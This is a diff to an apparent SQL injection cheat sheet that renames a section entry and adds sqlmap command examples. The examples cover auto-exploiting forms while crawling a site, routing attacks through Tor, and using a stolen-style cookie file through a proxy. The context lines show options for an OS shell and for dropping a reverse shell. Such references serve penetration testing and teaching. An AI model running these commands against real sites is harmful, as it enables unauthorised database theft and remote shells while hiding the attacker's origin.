@@ -15,7 +15,7 @@ A SQL injection attack consists of insertion or "injection" of a SQL query via t
 * [SQL injection using SQLmap](#sql-injection-using-sqlmap)
 * [Authentication bypass](#authentication-bypass)
 * [Polyglot injection](#polyglot-injection-multicontext)
-* [Second order injection](#second-order-injection)
+* [Routed injection](#routed-injection)
 * [Insert Statement - ON DUPLICATE KEY UPDATE](#insert-statement---on-duplicate-key-update)
 * [WAF Bypass](#waf-bypass)
 
@@ -136,6 +136,28 @@ python sqlmap.py -u "http://example.com/?id=1"  -p id --os-shell
 
 Dropping a reverse-shell / meterpreter
 python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn
+```
+
+Crawl a website with SQLmap and auto-exploit
+
+```powershell
+sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
+
+--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
+--crawl = how deep you want to crawl a site
+--forms = Parse and test forms
+```
+
+Using TOR with SQLmap
+
+```powershell
+sqlmap -u "http://www.target.com" --tor --tor-type=SOCKS5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5
+```
+
+Using Chrome cookie and a Proxy
+
+```powershell
+sqlmap -u "https://test.com/index.php?id=99" --load-cookie=/media/truecrypt1/TI/cookie.txt --proxy "http://127.0.0.1:8080"  -f  --time-sec 15 --level 3
 ```
 
 Using suffix to tamper the injection
